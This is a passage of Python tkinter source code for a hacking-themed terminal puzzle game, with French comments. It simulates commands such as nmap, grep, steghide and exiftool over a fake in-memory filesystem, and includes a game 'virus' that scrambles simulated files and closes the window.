        else:
            method = "get"
        url = None
        for part in parts:
            if part.startswith("http"):
                url = part
                break
        if not url:
            self.print_terminal("curl: No URL provided.")
            return
        try:
            endpoint = "/" + url.split("/", 3)[-1]
        except Exception:
            endpoint = "/"
        response = generate_api_response(endpoint, method)
        self.print_terminal("curl response:")
        self.print_terminal(response)

    def simulate_ps(self, cmd):
        self.print_terminal("  PID TTY          TIME CMD")
        self.print_terminal("  123 ?        00:00:01 bash")
        self.print_terminal("  456 ?        00:00:03 python")

    def simulate_top(self, cmd):
        self.print_terminal("top - 10:00:00 up 10 days,  2:34,  3 users,  load average: 0.10, 0.20, 0.30")
        self.print_terminal("Tasks: 123 total,   1 running, 122 sleeping,   0 stopped,   0 zombie")

    def simulate_grep(self, cmd):
        parts = cmd.split(maxsplit=2)
        if len(parts) < 3:
            self.print_terminal("grep: Usage: grep <pattern> <file>")
        else:
            pattern, file = parts[1], parts[2]
            full_path = self.resolve_path(file)
            content = self.get_fs_content(full_path)
            if content and isinstance(content, str):
                matches = [line for line in content.splitlines() if pattern in line]
                self.print_terminal("\n".join(matches) if matches else "grep: No matches found.")
            else:
                self.print_terminal(f"grep: {file}: No such file")

    def simulate_find(self, cmd):
        parts = cmd.split(maxsplit=2)
        if len(parts) < 3:
            self.print_terminal("find: Usage: find <directory> <pattern>")
        else:
            directory, pattern = parts[1], parts[2]
            full_path = self.resolve_path(directory)
            results = []
            def search_files(fs, path=""):
                if isinstance(fs, dict):
                    for key, value in fs.items():
                        search_files(value, path + "/" + key)
                else:
                    if pattern in fs:
                        results.append(path)
            fs_content = self.get_fs_content(full_path)
            if fs_content is not None:
                search_files(fs_content, full_path)
                self.print_terminal("\n".join(results) if results else "find: No files found matching the pattern.")
            else:
                self.print_terminal(f"find: {directory}: No such directory")

    def simulate_nmap(self, cmd):
        self.print_terminal("Starting Nmap scan...")
        self.print_terminal("Scanning 192.168.1.0/24 ...")
        self.print_terminal("Found hosts:")
        self.print_terminal("192.168.1.200 - remote_server (HTTP port 80 open)")
        self.print_terminal("192.168.1.150 - db_server (MySQL port 3306 open)")

    # --- Simulation d'une attaque virale ---
    def schedule_virus_attack(self):
        delay = random.randint(30000, VIRUS_INTERVAL)
        self.master.after(delay, self.simulate_virus_attack)

    def is_player_too_strong(self):
        # Définir que le joueur est "trop fort" s'il a trouvé au moins 3 indices
        return len(self.indices_found) >= 3

    def simulate_virus_attack(self):
        # Le virus s'active si DEV_ENABLE_VIRUS est True ou si le joueur est trop fort.
        if not (self.virus_enabled or self.is_player_too_strong()):
            # Le joueur n'est pas assez performant, on planifie l'attaque sans rien faire
            self.schedule_virus_attack()
            return

        self.print_terminal("[ALERT] Virus attack detected!")
        # Récupérer tous les fichiers secondaires susceptibles d'être corrompus
        all_files = self.collect_all_files(self.filesystem)
        secondary_files = [f for f in all_files if not (f.startswith("/etc/.shadow") or 
                                                         f.startswith("/etc/sudo_passwd") or
                                                         f.startswith("/etc/restore.log") or
                                                         f.startswith("/etc/fake_shadow") or
                                                         f.startswith("/home/agent007/.final_pass"))]
        if secondary_files:
            target = random.choice(secondary_files)
            self.set_fs_content(target, random_string(50))
            self.print_terminal(f"[ALERT] File {target} corrupted by virus!")
            self.virus_active = True
            self.virus_progress += 25
            if self.virus_progress >= 50:
                auth_log = self.get_fs_content("/var/logs/auth.log")
                if auth_log:
                    self.set_fs_content("/var/logs/auth.log", random_string(40))
                    self.print_terminal("[WARNING] /var/logs/auth.log has been corrupted!")
            if self.virus_progress >= 100:
                self.print_terminal("[CRITICAL] System integrity compromised!")
                self.master.destroy()
        else:
            self.print_terminal("[ALERT] No files available for infection.")
        self.schedule_virus_attack()


    def collect_all_files(self, fs, path="/"):
        paths = []
        if isinstance(fs, dict):
            for key, value in fs.items():
                new_path = path + key + "/"
                paths.extend(self.collect_all_files(value, new_path))
        else:
            paths.append(path.rstrip("/"))
        return paths

    # --- Commandes supplémentaires : steghide et exiftool ---
    def handle_steghide(self, cmd):
        # Syntaxe : steghide extract -sf <file> -p <password>
        if "extract" in cmd and "-sf" in cmd and "-p" in cmd:
            parts = cmd.split()
            try:
                passwd = parts[parts.index("-p") + 1]
                # Vérifier si le mot de passe correspond à la clé réelle (extrait de STEGO_KEY)
                if passwd == base64.b64decode(STEGO_KEY).decode():
                    self.print_terminal("steghide: Extraction successful. Hidden file 'stego.txt' created.")
                    self.print_terminal(f"CONTENT: {base64.b64decode('V1JPTkcgUExBQ0UgVE8gTE9PSw==').decode()}")
                    self.stego_found = True
                    self.indices_found.add("stego")
                    self.last_progress_time = time.time()
                    # Vérifier si les 3 indices (shadow, caesar et stego) ont été obtenus pour imposer la pause
                    if len(self.indices_found) >= 3 and not self.pause_enforced:
                        self.enforce_pause()
                else:
                    self.print_terminal("steghide: Incorrect password.")
            except Exception:
                self.print_terminal("steghide: Invalid command format.")
        else:
            self.print_terminal("steghide: Usage: extract -sf <file> -p <password>")

    def handle_exiftool(self, cmd):
        parts = cmd.split(maxsplit=1)
        if len(parts) < 2:
            self.print_terminal("exiftool: Usage: exiftool <file>")
            return
        filename = parts[1]
        full_path = self.resolve_path(filename)
        if full_path.endswith(".img"):
            self.print_terminal("exiftool output:")
            self.print_terminal("File Name: profile.img")
            self.print_terminal("File Size: 120KB")
            self.print_terminal("Image Width: 800")
            self.print_terminal("Image Height: 600")
            self.print_terminal("Orientation: Normal")
        else:
            self.print_terminal(f"exiftool: {filename}: Not an image file.")

if __name__ == "__main__":
    root = tk.Tk()
    root.resizable(True, True)
    app = TerminalAdvancedChallenge(root)
    root.mainloop()
